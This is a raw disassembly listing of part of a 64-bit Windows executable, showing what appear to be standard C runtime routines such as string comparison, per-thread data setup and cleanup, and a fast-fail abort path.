   140004f38:	f6 05 01 21 01 00 02 	testb  $0x2,0x12101(%rip)        # 0x140017040
   140004f3f:	74 2a                	je     0x140004f6b
   140004f41:	b9 17 00 00 00       	mov    $0x17,%ecx
   140004f46:	ff 15 ac 81 00 00    	call   *0x81ac(%rip)        # 0x14000d0f8
   140004f4c:	85 c0                	test   %eax,%eax
   140004f4e:	74 07                	je     0x140004f57
   140004f50:	b9 07 00 00 00       	mov    $0x7,%ecx
   140004f55:	cd 29                	int    $0x29
   140004f57:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004f5d:	ba 15 00 00 40       	mov    $0x40000015,%edx
   140004f62:	41 8d 48 02          	lea    0x2(%r8),%ecx
   140004f66:	e8 f1 06 00 00       	call   0x14000565c
   140004f6b:	b9 03 00 00 00       	mov    $0x3,%ecx
   140004f70:	e8 bb f7 ff ff       	call   0x140004730
   140004f75:	cc                   	int3
   140004f76:	cc                   	int3
   140004f77:	cc                   	int3
   140004f78:	e9 7b 11 00 00       	jmp    0x1400060f8
   140004f7d:	cc                   	int3
   140004f7e:	cc                   	int3
   140004f7f:	cc                   	int3
   140004f80:	cc                   	int3
   140004f81:	cc                   	int3
   140004f82:	cc                   	int3
   140004f83:	cc                   	int3
   140004f84:	cc                   	int3
   140004f85:	cc                   	int3
   140004f86:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004f8d:	00 00 00 
   140004f90:	48 2b d1             	sub    %rcx,%rdx
   140004f93:	4d 85 c0             	test   %r8,%r8
   140004f96:	74 6a                	je     0x140005002
   140004f98:	f7 c1 07 00 00 00    	test   $0x7,%ecx
   140004f9e:	74 1d                	je     0x140004fbd
   140004fa0:	0f b6 01             	movzbl (%rcx),%eax
   140004fa3:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   140004fa6:	75 5d                	jne    0x140005005
   140004fa8:	48 ff c1             	inc    %rcx
   140004fab:	49 ff c8             	dec    %r8
   140004fae:	74 52                	je     0x140005002
   140004fb0:	84 c0                	test   %al,%al
   140004fb2:	74 4e                	je     0x140005002
   140004fb4:	48 f7 c1 07 00 00 00 	test   $0x7,%rcx
   140004fbb:	75 e3                	jne    0x140004fa0
   140004fbd:	49 bb 80 80 80 80 80 	movabs $0x8080808080808080,%r11
   140004fc4:	80 80 80 
   140004fc7:	49 ba ff fe fe fe fe 	movabs $0xfefefefefefefeff,%r10
   140004fce:	fe fe fe 
   140004fd1:	8d 04 0a             	lea    (%rdx,%rcx,1),%eax
   140004fd4:	25 ff 0f 00 00       	and    $0xfff,%eax
   140004fd9:	3d f8 0f 00 00       	cmp    $0xff8,%eax
   140004fde:	77 c0                	ja     0x140004fa0
   140004fe0:	48 8b 01             	mov    (%rcx),%rax
   140004fe3:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   140004fe7:	75 b7                	jne    0x140004fa0
   140004fe9:	48 83 c1 08          	add    $0x8,%rcx
   140004fed:	49 83 e8 08          	sub    $0x8,%r8
   140004ff1:	76 0f                	jbe    0x140005002
   140004ff3:	4d 8d 0c 02          	lea    (%r10,%rax,1),%r9
   140004ff7:	48 f7 d0             	not    %rax
   140004ffa:	49 23 c1             	and    %r9,%rax
   140004ffd:	49 85 c3             	test   %rax,%r11
   140005000:	74 cf                	je     0x140004fd1
   140005002:	33 c0                	xor    %eax,%eax
   140005004:	c3                   	ret
   140005005:	48 1b c0             	sbb    %rax,%rax
   140005008:	48 83 c8 01          	or     $0x1,%rax
   14000500c:	c3                   	ret
   14000500d:	cc                   	int3
   14000500e:	cc                   	int3
   14000500f:	cc                   	int3
   140005010:	4d 85 c0             	test   %r8,%r8
   140005013:	75 18                	jne    0x14000502d
   140005015:	33 c0                	xor    %eax,%eax
   140005017:	c3                   	ret
   140005018:	0f b7 01             	movzwl (%rcx),%eax
   14000501b:	66 85 c0             	test   %ax,%ax
   14000501e:	74 13                	je     0x140005033
   140005020:	66 3b 02             	cmp    (%rdx),%ax
   140005023:	75 0e                	jne    0x140005033
   140005025:	48 83 c1 02          	add    $0x2,%rcx
   140005029:	48 83 c2 02          	add    $0x2,%rdx
   14000502d:	49 83 e8 01          	sub    $0x1,%r8
   140005031:	75 e5                	jne    0x140005018
   140005033:	0f b7 01             	movzwl (%rcx),%eax
   140005036:	0f b7 0a             	movzwl (%rdx),%ecx
   140005039:	2b c1                	sub    %ecx,%eax
   14000503b:	c3                   	ret
   14000503c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005041:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140005046:	57                   	push   %rdi
   140005047:	48 83 ec 20          	sub    $0x20,%rsp
   14000504b:	49 8b d9             	mov    %r9,%rbx
   14000504e:	49 8b f8             	mov    %r8,%rdi
   140005051:	8b 0a                	mov    (%rdx),%ecx
   140005053:	e8 d0 0f 00 00       	call   0x140006028
   140005058:	90                   	nop
   140005059:	48 8b 07             	mov    (%rdi),%rax
   14000505c:	48 8b 08             	mov    (%rax),%rcx
   14000505f:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140005066:	f0 ff 00             	lock incl (%rax)
   140005069:	8b 0b                	mov    (%rbx),%ecx
   14000506b:	e8 0c 10 00 00       	call   0x14000607c
   140005070:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005075:	48 83 c4 20          	add    $0x20,%rsp
   140005079:	5f                   	pop    %rdi
   14000507a:	c3                   	ret
   14000507b:	cc                   	int3
   14000507c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005081:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140005086:	57                   	push   %rdi
   140005087:	48 83 ec 20          	sub    $0x20,%rsp
   14000508b:	49 8b d9             	mov    %r9,%rbx
   14000508e:	49 8b f8             	mov    %r8,%rdi
   140005091:	8b 0a                	mov    (%rdx),%ecx
   140005093:	e8 90 0f 00 00       	call   0x140006028
   140005098:	90                   	nop
   140005099:	48 8b 0f             	mov    (%rdi),%rcx
   14000509c:	33 d2                	xor    %edx,%edx
   14000509e:	48 8b 09             	mov    (%rcx),%rcx
   1400050a1:	e8 a6 02 00 00       	call   0x14000534c
   1400050a6:	90                   	nop
   1400050a7:	8b 0b                	mov    (%rbx),%ecx
   1400050a9:	e8 ce 0f 00 00       	call   0x14000607c
   1400050ae:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400050b3:	48 83 c4 20          	add    $0x20,%rsp
   1400050b7:	5f                   	pop    %rdi
   1400050b8:	c3                   	ret
   1400050b9:	cc                   	int3
   1400050ba:	cc                   	int3
   1400050bb:	cc                   	int3
   1400050bc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400050c1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400050c6:	57                   	push   %rdi
   1400050c7:	48 83 ec 20          	sub    $0x20,%rsp
   1400050cb:	49 8b d9             	mov    %r9,%rbx
   1400050ce:	49 8b f8             	mov    %r8,%rdi
   1400050d1:	8b 0a                	mov    (%rdx),%ecx
   1400050d3:	e8 50 0f 00 00       	call   0x140006028
   1400050d8:	90                   	nop
   1400050d9:	48 8b 47 08          	mov    0x8(%rdi),%rax
   1400050dd:	48 8b 10             	mov    (%rax),%rdx
   1400050e0:	48 8b 0f             	mov    (%rdi),%rcx
   1400050e3:	48 8b 12             	mov    (%rdx),%rdx
   1400050e6:	48 8b 09             	mov    (%rcx),%rcx
   1400050e9:	e8 5e 02 00 00       	call   0x14000534c
   1400050ee:	90                   	nop
   1400050ef:	8b 0b                	mov    (%rbx),%ecx
   1400050f1:	e8 86 0f 00 00       	call   0x14000607c
   1400050f6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400050fb:	48 83 c4 20          	add    $0x20,%rsp
   1400050ff:	5f                   	pop    %rdi
   140005100:	c3                   	ret
   140005101:	cc                   	int3
   140005102:	cc                   	int3
   140005103:	cc                   	int3
   140005104:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005109:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000510e:	57                   	push   %rdi
   14000510f:	48 83 ec 20          	sub    $0x20,%rsp
   140005113:	49 8b d9             	mov    %r9,%rbx
   140005116:	49 8b f8             	mov    %r8,%rdi
   140005119:	8b 0a                	mov    (%rdx),%ecx
   14000511b:	e8 08 0f 00 00       	call   0x140006028
   140005120:	90                   	nop
   140005121:	48 8b 07             	mov    (%rdi),%rax
   140005124:	48 8b 08             	mov    (%rax),%rcx
   140005127:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   14000512e:	48 85 c9             	test   %rcx,%rcx
   140005131:	74 1e                	je     0x140005151
   140005133:	83 c8 ff             	or     $0xffffffff,%eax
   140005136:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   14000513a:	83 f8 01             	cmp    $0x1,%eax
   14000513d:	75 12                	jne    0x140005151
   14000513f:	48 8d 05 8a 20 01 00 	lea    0x1208a(%rip),%rax        # 0x1400171d0
   140005146:	48 3b c8             	cmp    %rax,%rcx
   140005149:	74 06                	je     0x140005151
   14000514b:	e8 20 10 00 00       	call   0x140006170
   140005150:	90                   	nop
   140005151:	8b 0b                	mov    (%rbx),%ecx
   140005153:	e8 24 0f 00 00       	call   0x14000607c
   140005158:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000515d:	48 83 c4 20          	add    $0x20,%rsp
   140005161:	5f                   	pop    %rdi
   140005162:	c3                   	ret
   140005163:	cc                   	int3
   140005164:	40 55                	rex push %rbp
   140005166:	48 8b ec             	mov    %rsp,%rbp
   140005169:	48 83 ec 50          	sub    $0x50,%rsp
   14000516d:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
   140005171:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140005175:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140005179:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   14000517d:	ba 01 00 00 00       	mov    $0x1,%edx
   140005182:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140005186:	b8 05 00 00 00       	mov    $0x5,%eax
   14000518b:	89 45 20             	mov    %eax,0x20(%rbp)
   14000518e:	89 45 28             	mov    %eax,0x28(%rbp)
   140005191:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140005195:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140005199:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   14000519d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400051a1:	b8 04 00 00 00       	mov    $0x4,%eax
   1400051a6:	89 45 d0             	mov    %eax,-0x30(%rbp)
   1400051a9:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   1400051ac:	48 8d 05 7d 33 01 00 	lea    0x1337d(%rip),%rax        # 0x140018530
   1400051b3:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   1400051b7:	89 51 28             	mov    %edx,0x28(%rcx)
   1400051ba:	48 8d 0d 7f 91 00 00 	lea    0x917f(%rip),%rcx        # 0x14000e340
   1400051c1:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400051c5:	48 89 08             	mov    %rcx,(%rax)
   1400051c8:	48 8d 0d 01 20 01 00 	lea    0x12001(%rip),%rcx        # 0x1400171d0
   1400051cf:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400051d3:	89 90 a8 03 00 00    	mov    %edx,0x3a8(%rax)
   1400051d9:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400051dd:	48 89 88 88 00 00 00 	mov    %rcx,0x88(%rax)
   1400051e4:	8d 4a 42             	lea    0x42(%rdx),%ecx
   1400051e7:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400051eb:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   1400051ef:	66 89 88 bc 00 00 00 	mov    %cx,0xbc(%rax)
   1400051f6:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400051fa:	66 89 88 c2 01 00 00 	mov    %cx,0x1c2(%rax)
   140005201:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140005205:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140005209:	48 83 a0 a0 03 00 00 	andq   $0x0,0x3a0(%rax)
   140005210:	00 
   140005211:	e8 26 fe ff ff       	call   0x14000503c
   140005216:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   14000521a:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   14000521e:	48 8d 55 d4          	lea    -0x2c(%rbp),%rdx
   140005222:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140005226:	e8 91 fe ff ff       	call   0x1400050bc
   14000522b:	48 83 c4 50          	add    $0x50,%rsp
   14000522f:	5d                   	pop    %rbp
   140005230:	c3                   	ret
   140005231:	cc                   	int3
   140005232:	cc                   	int3
   140005233:	cc                   	int3
   140005234:	48 85 c9             	test   %rcx,%rcx
   140005237:	74 1a                	je     0x140005253
   140005239:	53                   	push   %rbx
   14000523a:	48 83 ec 20          	sub    $0x20,%rsp
   14000523e:	48 8b d9             	mov    %rcx,%rbx
   140005241:	e8 0e 00 00 00       	call   0x140005254
   140005246:	48 8b cb             	mov    %rbx,%rcx
   140005249:	e8 22 0f 00 00       	call   0x140006170
   14000524e:	48 83 c4 20          	add    $0x20,%rsp
   140005252:	5b                   	pop    %rbx
   140005253:	c3                   	ret
   140005254:	40 55                	rex push %rbp
   140005256:	48 8b ec             	mov    %rsp,%rbp
   140005259:	48 83 ec 40          	sub    $0x40,%rsp
   14000525d:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   140005261:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140005265:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140005269:	48 8d 15 d0 90 00 00 	lea    0x90d0(%rip),%rdx        # 0x14000e340
   140005270:	b8 05 00 00 00       	mov    $0x5,%eax
   140005275:	89 45 20             	mov    %eax,0x20(%rbp)
   140005278:	89 45 28             	mov    %eax,0x28(%rbp)
   14000527b:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   14000527f:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140005283:	b8 04 00 00 00       	mov    $0x4,%eax
   140005288:	89 45 e0             	mov    %eax,-0x20(%rbp)
   14000528b:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   14000528e:	48 8b 01             	mov    (%rcx),%rax
   140005291:	48 3b c2             	cmp    %rdx,%rax
   140005294:	74 0c                	je     0x1400052a2
   140005296:	48 8b c8             	mov    %rax,%rcx
   140005299:	e8 d2 0e 00 00       	call   0x140006170
   14000529e:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400052a2:	48 8b 49 70          	mov    0x70(%rcx),%rcx
   1400052a6:	e8 c5 0e 00 00       	call   0x140006170
   1400052ab:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400052af:	48 8b 49 58          	mov    0x58(%rcx),%rcx
   1400052b3:	e8 b8 0e 00 00       	call   0x140006170
   1400052b8:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400052bc:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   1400052c0:	e8 ab 0e 00 00       	call   0x140006170
   1400052c5:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400052c9:	48 8b 49 68          	mov    0x68(%rcx),%rcx
   1400052cd:	e8 9e 0e 00 00       	call   0x140006170
   1400052d2:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400052d6:	48 8b 49 48          	mov    0x48(%rcx),%rcx
   1400052da:	e8 91 0e 00 00       	call   0x140006170
   1400052df:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400052e3:	48 8b 49 50          	mov    0x50(%rcx),%rcx
   1400052e7:	e8 84 0e 00 00       	call   0x140006170
   1400052ec:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400052f0:	48 8b 49 78          	mov    0x78(%rcx),%rcx
   1400052f4:	e8 77 0e 00 00       	call   0x140006170
   1400052f9:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400052fd:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140005304:	e8 67 0e 00 00       	call   0x140006170
   140005309:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   14000530d:	48 8b 89 c0 03 00 00 	mov    0x3c0(%rcx),%rcx
   140005314:	e8 57 0e 00 00       	call   0x140006170
   140005319:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   14000531d:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140005321:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   140005325:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140005329:	e8 d6 fd ff ff       	call   0x140005104
   14000532e:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   140005332:	4c 8d 45 f8          	lea    -0x8(%rbp),%r8
   140005336:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   14000533a:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000533e:	e8 39 fd ff ff       	call   0x14000507c
   140005343:	48 83 c4 40          	add    $0x40,%rsp
   140005347:	5d                   	pop    %rbp
   140005348:	c3                   	ret
   140005349:	cc                   	int3
   14000534a:	cc                   	int3
   14000534b:	cc                   	int3
   14000534c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005351:	57                   	push   %rdi
   140005352:	48 83 ec 20          	sub    $0x20,%rsp
   140005356:	48 8b f9             	mov    %rcx,%rdi
   140005359:	48 8b da             	mov    %rdx,%rbx
   14000535c:	48 8b 89 90 00 00 00 	mov    0x90(%rcx),%rcx
   140005363:	48 85 c9             	test   %rcx,%rcx
   140005366:	74 2c                	je     0x140005394
   140005368:	e8 47 34 00 00       	call   0x1400087b4
   14000536d:	48 8b 8f 90 00 00 00 	mov    0x90(%rdi),%rcx
   140005374:	48 3b 0d b5 31 01 00 	cmp    0x131b5(%rip),%rcx        # 0x140018530
   14000537b:	74 17                	je     0x140005394
   14000537d:	48 8d 05 dc 1c 01 00 	lea    0x11cdc(%rip),%rax        # 0x140017060
   140005384:	48 3b c8             	cmp    %rax,%rcx
   140005387:	74 0b                	je     0x140005394
   140005389:	83 79 10 00          	cmpl   $0x0,0x10(%rcx)
   14000538d:	75 05                	jne    0x140005394
   14000538f:	e8 20 32 00 00       	call   0x1400085b4
   140005394:	48 89 9f 90 00 00 00 	mov    %rbx,0x90(%rdi)
   14000539b:	48 85 db             	test   %rbx,%rbx
   14000539e:	74 08                	je     0x1400053a8
   1400053a0:	48 8b cb             	mov    %rbx,%rcx
   1400053a3:	e8 80 31 00 00       	call   0x140008528
   1400053a8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400053ad:	48 83 c4 20          	add    $0x20,%rsp
   1400053b1:	5f                   	pop    %rdi
   1400053b2:	c3                   	ret
   1400053b3:	cc                   	int3
   1400053b4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400053b9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400053be:	57                   	push   %rdi
   1400053bf:	48 83 ec 20          	sub    $0x20,%rsp
   1400053c3:	ff 15 4f 7c 00 00    	call   *0x7c4f(%rip)        # 0x14000d018
   1400053c9:	8b 0d 81 1c 01 00    	mov    0x11c81(%rip),%ecx        # 0x140017050
   1400053cf:	8b d8                	mov    %eax,%ebx
   1400053d1:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1400053d4:	74 1f                	je     0x1400053f5
   1400053d6:	e8 c9 08 00 00       	call   0x140005ca4
   1400053db:	48 8b f8             	mov    %rax,%rdi
   1400053de:	48 85 c0             	test   %rax,%rax
   1400053e1:	74 0c                	je     0x1400053ef
   1400053e3:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400053e7:	75 73                	jne    0x14000545c
   1400053e9:	33 ff                	xor    %edi,%edi
   1400053eb:	33 f6                	xor    %esi,%esi
   1400053ed:	eb 70                	jmp    0x14000545f
   1400053ef:	8b 0d 5b 1c 01 00    	mov    0x11c5b(%rip),%ecx        # 0x140017050
   1400053f5:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   1400053f9:	e8 ee 08 00 00       	call   0x140005cec
   1400053fe:	85 c0                	test   %eax,%eax
   140005400:	74 e7                	je     0x1400053e9
   140005402:	ba c8 03 00 00       	mov    $0x3c8,%edx
   140005407:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000540c:	e8 e7 0c 00 00       	call   0x1400060f8
   140005411:	8b 0d 39 1c 01 00    	mov    0x11c39(%rip),%ecx        # 0x140017050
   140005417:	48 8b f8             	mov    %rax,%rdi
   14000541a:	48 85 c0             	test   %rax,%rax
   14000541d:	75 10                	jne    0x14000542f
   14000541f:	33 d2                	xor    %edx,%edx
   140005421:	e8 c6 08 00 00       	call   0x140005cec
   140005426:	33 c9                	xor    %ecx,%ecx
   140005428:	e8 43 0d 00 00       	call   0x140006170
   14000542d:	eb ba                	jmp    0x1400053e9
   14000542f:	48 8b d7             	mov    %rdi,%rdx
   140005432:	e8 b5 08 00 00       	call   0x140005cec
   140005437:	85 c0                	test   %eax,%eax
   140005439:	75 12                	jne    0x14000544d
   14000543b:	8b 0d 0f 1c 01 00    	mov    0x11c0f(%rip),%ecx        # 0x140017050
   140005441:	33 d2                	xor    %edx,%edx
   140005443:	e8 a4 08 00 00       	call   0x140005cec
   140005448:	48 8b cf             	mov    %rdi,%rcx
   14000544b:	eb db                	jmp    0x140005428
   14000544d:	48 8b cf             	mov    %rdi,%rcx
   140005450:	e8 0f fd ff ff       	call   0x140005164
   140005455:	33 c9                	xor    %ecx,%ecx
   140005457:	e8 14 0d 00 00       	call   0x140006170
   14000545c:	48 8b f7             	mov    %rdi,%rsi
   14000545f:	8b cb                	mov    %ebx,%ecx
   140005461:	ff 15 e1 7c 00 00    	call   *0x7ce1(%rip)        # 0x14000d148
   140005467:	48 f7 df             	neg    %rdi
   14000546a:	48 1b c0             	sbb    %rax,%rax
   14000546d:	48 23 c6             	and    %rsi,%rax
   140005470:	74 10                	je     0x140005482
   140005472:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005477:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000547c:	48 83 c4 20          	add    $0x20,%rsp
   140005480:	5f                   	pop    %rdi
   140005481:	c3                   	ret
   140005482:	e8 99 fa ff ff       	call   0x140004f20
   140005487:	cc                   	int3
   140005488:	40 53                	rex push %rbx
   14000548a:	48 83 ec 20          	sub    $0x20,%rsp
   14000548e:	8b 0d bc 1b 01 00    	mov    0x11bbc(%rip),%ecx        # 0x140017050
   140005494:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140005497:	74 1b                	je     0x1400054b4
   140005499:	e8 06 08 00 00       	call   0x140005ca4
   14000549e:	48 8b d8             	mov    %rax,%rbx
   1400054a1:	48 85 c0             	test   %rax,%rax
   1400054a4:	74 08                	je     0x1400054ae
   1400054a6:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400054aa:	74 7d                	je     0x140005529
   1400054ac:	eb 6d                	jmp    0x14000551b
   1400054ae:	8b 0d 9c 1b 01 00    	mov    0x11b9c(%rip),%ecx        # 0x140017050
   1400054b4:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   1400054b8:	e8 2f 08 00 00       	call   0x140005cec
   1400054bd:	85 c0                	test   %eax,%eax
   1400054bf:	74 68                	je     0x140005529
   1400054c1:	ba c8 03 00 00       	mov    $0x3c8,%edx
   1400054c6:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400054cb:	e8 28 0c 00 00       	call   0x1400060f8
   1400054d0:	8b 0d 7a 1b 01 00    	mov    0x11b7a(%rip),%ecx        # 0x140017050
   1400054d6:	48 8b d8             	mov    %rax,%rbx
   1400054d9:	48 85 c0             	test   %rax,%rax
   1400054dc:	75 10                	jne    0x1400054ee
   1400054de:	33 d2                	xor    %edx,%edx
   1400054e0:	e8 07 08 00 00       	call   0x140005cec
   1400054e5:	33 c9                	xor    %ecx,%ecx
   1400054e7:	e8 84 0c 00 00       	call   0x140006170
   1400054ec:	eb 3b                	jmp    0x140005529
   1400054ee:	48 8b d3             	mov    %rbx,%rdx
   1400054f1:	e8 f6 07 00 00       	call   0x140005cec
   1400054f6:	85 c0                	test   %eax,%eax
   1400054f8:	75 12                	jne    0x14000550c
   1400054fa:	8b 0d 50 1b 01 00    	mov    0x11b50(%rip),%ecx        # 0x140017050
   140005500:	33 d2                	xor    %edx,%edx
   140005502:	e8 e5 07 00 00       	call   0x140005cec
   140005507:	48 8b cb             	mov    %rbx,%rcx
   14000550a:	eb db                	jmp    0x1400054e7
   14000550c:	48 8b cb             	mov    %rbx,%rcx
   14000550f:	e8 50 fc ff ff       	call   0x140005164
   140005514:	33 c9                	xor    %ecx,%ecx
   140005516:	e8 55 0c 00 00       	call   0x140006170
   14000551b:	48 85 db             	test   %rbx,%rbx
   14000551e:	74 09                	je     0x140005529
   140005520:	48 8b c3             	mov    %rbx,%rax
   140005523:	48 83 c4 20          	add    $0x20,%rsp
   140005527:	5b                   	pop    %rbx
   140005528:	c3                   	ret
   140005529:	e8 f2 f9 ff ff       	call   0x140004f20
   14000552e:	cc                   	int3
   14000552f:	cc                   	int3
   140005530:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005535:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000553a:	57                   	push   %rdi
   14000553b:	48 83 ec 20          	sub    $0x20,%rsp
   14000553f:	ff 15 d3 7a 00 00    	call   *0x7ad3(%rip)        # 0x14000d018
   140005545:	8b 0d 05 1b 01 00    	mov    0x11b05(%rip),%ecx        # 0x140017050
   14000554b:	8b d8                	mov    %eax,%ebx
   14000554d:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140005550:	74 1f                	je     0x140005571
   140005552:	e8 4d 07 00 00       	call   0x140005ca4
   140005557:	48 8b f8             	mov    %rax,%rdi
   14000555a:	48 85 c0             	test   %rax,%rax
   14000555d:	74 0c                	je     0x14000556b
   14000555f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140005563:	75 73                	jne    0x1400055d8
   140005565:	33 ff                	xor    %edi,%edi
   140005567:	33 f6                	xor    %esi,%esi
   140005569:	eb 70                	jmp    0x1400055db
   14000556b:	8b 0d df 1a 01 00    	mov    0x11adf(%rip),%ecx        # 0x140017050
   140005571:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140005575:	e8 72 07 00 00       	call   0x140005cec
   14000557a:	85 c0                	test   %eax,%eax
   14000557c:	74 e7                	je     0x140005565
   14000557e:	ba c8 03 00 00       	mov    $0x3c8,%edx
   140005583:	b9 01 00 00 00       	mov    $0x1,%ecx
   140005588:	e8 6b 0b 00 00       	call   0x1400060f8
   14000558d:	8b 0d bd 1a 01 00    	mov    0x11abd(%rip),%ecx        # 0x140017050
   140005593:	48 8b f8             	mov    %rax,%rdi
   140005596:	48 85 c0             	test   %rax,%rax
   140005599:	75 10                	jne    0x1400055ab
   14000559b:	33 d2                	xor    %edx,%edx
   14000559d:	e8 4a 07 00 00       	call   0x140005cec
   1400055a2:	33 c9                	xor    %ecx,%ecx
   1400055a4:	e8 c7 0b 00 00       	call   0x140006170
   1400055a9:	eb ba                	jmp    0x140005565
   1400055ab:	48 8b d7             	mov    %rdi,%rdx
   1400055ae:	e8 39 07 00 00       	call   0x140005cec
   1400055b3:	85 c0                	test   %eax,%eax
   1400055b5:	75 12                	jne    0x1400055c9
   1400055b7:	8b 0d 93 1a 01 00    	mov    0x11a93(%rip),%ecx        # 0x140017050
   1400055bd:	33 d2                	xor    %edx,%edx
   1400055bf:	e8 28 07 00 00       	call   0x140005cec
   1400055c4:	48 8b cf             	mov    %rdi,%rcx
   1400055c7:	eb db                	jmp    0x1400055a4
   1400055c9:	48 8b cf             	mov    %rdi,%rcx
   1400055cc:	e8 93 fb ff ff       	call   0x140005164
   1400055d1:	33 c9                	xor    %ecx,%ecx
   1400055d3:	e8 98 0b 00 00       	call   0x140006170
   1400055d8:	48 8b f7             	mov    %rdi,%rsi
   1400055db:	8b cb                	mov    %ebx,%ecx
   1400055dd:	ff 15 65 7b 00 00    	call   *0x7b65(%rip)        # 0x14000d148
   1400055e3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400055e8:	48 f7 df             	neg    %rdi
   1400055eb:	48 1b c0             	sbb    %rax,%rax
   1400055ee:	48 23 c6             	and    %rsi,%rax
   1400055f1:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400055f6:	48 83 c4 20          	add    $0x20,%rsp
   1400055fa:	5f                   	pop    %rdi
   1400055fb:	c3                   	ret
   1400055fc:	48 83 ec 28          	sub    $0x28,%rsp
   140005600:	48 8d 0d 2d fc ff ff 	lea    -0x3d3(%rip),%rcx        # 0x140005234
   140005607:	e8 08 06 00 00       	call   0x140005c14
   14000560c:	89 05 3e 1a 01 00    	mov    %eax,0x11a3e(%rip)        # 0x140017050
   140005612:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005615:	75 04                	jne    0x14000561b
   140005617:	32 c0                	xor    %al,%al
   140005619:	eb 15                	jmp    0x140005630
   14000561b:	e8 10 ff ff ff       	call   0x140005530
   140005620:	48 85 c0             	test   %rax,%rax
   140005623:	75 09                	jne    0x14000562e
   140005625:	33 c9                	xor    %ecx,%ecx
   140005627:	e8 0c 00 00 00       	call   0x140005638
   14000562c:	eb e9                	jmp    0x140005617
   14000562e:	b0 01                	mov    $0x1,%al
   140005630:	48 83 c4 28          	add    $0x28,%rsp
   140005634:	c3                   	ret
   140005635:	cc                   	int3
   140005636:	cc                   	int3
   140005637:	cc                   	int3
